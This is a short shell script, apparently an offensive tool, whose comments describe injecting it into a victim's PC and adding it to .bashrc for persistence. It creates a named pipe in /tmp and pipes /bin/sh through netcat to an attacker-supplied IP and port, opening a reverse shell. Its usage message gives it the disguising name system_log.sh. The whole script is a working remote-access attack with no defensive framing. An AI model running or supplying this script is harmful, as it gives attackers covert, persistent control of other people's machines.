#!/bin/sh
#To inject in the victims pc
#__author__: hAwAii_2.0
#Paste
#reverse_victim.sh $1 $2
#into .bashrc for persistence

if [ $# -lt 2 ]
then
    echo "USAGE: system_log.sh {ATTACKER_IP} {ATTACKER_LISTENING_PORT}"
else
    if [ ! -e /tmp/backpipe ]
    then
        mknod /tmp/backpipe p 
    fi
    
    /bin/sh 0</tmp/backpipe | nc $1 $2 1>/tmp/backpipe &
fi
